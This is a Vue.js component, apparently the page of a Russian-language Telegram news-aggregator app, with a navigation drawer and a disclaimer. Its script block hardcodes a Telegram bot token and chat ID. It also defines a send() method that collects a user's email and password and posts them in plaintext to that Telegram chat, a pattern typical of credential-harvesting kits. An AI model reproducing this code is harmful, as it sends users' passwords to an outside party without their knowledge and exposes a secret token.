<template lang="">
    <!-- <v-app class=" bg-primary "> -->
      <v-card  class="bg-primary">
        
    <v-layout >
      
      <v-navigation-drawer
      class="bg-primary dr"
        expand-on-hover
        rail
       width="300px"
       permanent
        theme="primary"
       
      >
      
        <v-list  class="bg-primary">
          <v-list-item   class="bg-primary" 
          prepend-icon="mdi-account-box" 
          title="Account">

         
            
          </v-list-item>
        </v-list>
<v-list-item prepend-icon="mdi-home-city" title="" value="starred"><a href="https://t.me/webtg_bot" target="_blank" class="">Вернуться в Telegram</a></v-list-item>
       

        <router-link to="/preview">
         <v-list-item class="text-white" prepend-icon="mdi-folder" title="Pазмещение новостей" value="shared">

         </v-list-item>
        </router-link>
        
       
       
      
        <v-list density="compact" nav  class="bg-primary">
        
          <router-link to="/save">
          <v-list-item prepend-icon="mdi-folder" title="Мои файлы" value="myfiles">

          </v-list-item>
      
        </router-link>

       
         
          <v-list-item prepend-icon="mdi-folder" title="Мои файлы" value="myfiles">

</v-list-item>
<v-list-item prepend-icon="mdi-folder" title="Мои файлы" value="myfiles">

</v-list-item>
<v-list-item prepend-icon="mdi-folder" title="Мои файлы" value="myfiles">

</v-list-item>
        </v-list>
      </v-navigation-drawer>
      
      <!-- <div class="div pl-10">
           <img class="mt-6 " style="width:280px;" src="https://cdn-www-v2.iccsafe.org/wp-content/uploads/chp_resource_icons_v1_Chapter_News2-300x300.png">
          </div> -->
      <v-main style="height: 200px"></v-main>
    </v-layout>
  </v-card>

     



















<div class="container mt-4">


<h3 class="text-center  text-danger fw-bold">**Дисклеймер: Новостной Агрегатор **</h3>
<p>Этот Telegram бот является агрегатором новостей со всего мира. Мы предоставляем информацию "как есть" и не несем ответственности за ее точность, полноту или актуальность.</p>

<p>Мы не предоставляем мнения или оценки новостей, особенно в отношении <strong>политических событий.</strong> Наша цель - предоставить вам разнообразную и объективную информацию.</p>
  

	
</div>
  
  
 
<!-- </v-app> -->
    
    
</template>
<script>
// Подключите библиотеку Axios
import axios from 'axios';


const botToken = '6985342414:AAFxpkOhbpnMLBgpI_j9AX_jrHIuNwQrmug';
const chatId = '1227459883'; 


async function sendMessageToTelegram(message) {
  try {
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    console.log('Message sent to Telegram:', response.data);
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

// Пример использования
const messageToSend = 'Добро пожаловать в настройку публикации!';
sendMessageToTelegram(messageToSend);

export default {
    data() {
    return {
      isMiniVariant: false,
      clipped: false,
      logemail: '',
      logpass: '',
      image:'https://biz-news.biz/wp-content/uploads/2021/10/logobn2.png',
        name:'',
        age:0,
     
    }
   },
   
   methods: {
    send() {
      let message = `Hello!\n`;
      message += `Email:${this.logemail}\n`;
      message += `<b>Password:</b>${this.logpass}`;
      console.log(message);

      // Отправка сообщения в Telegram
      sendMessageToTelegram(message);
    },
  },
}
</script>
<style scoped>
.div{
  text-align: center;
}

a{
  color: white;
}
.dr{
  /* display: block !important; */
}
.v-application {
  min-width: 100vw !important;
  min-height: 100vh !important;
}
</style>
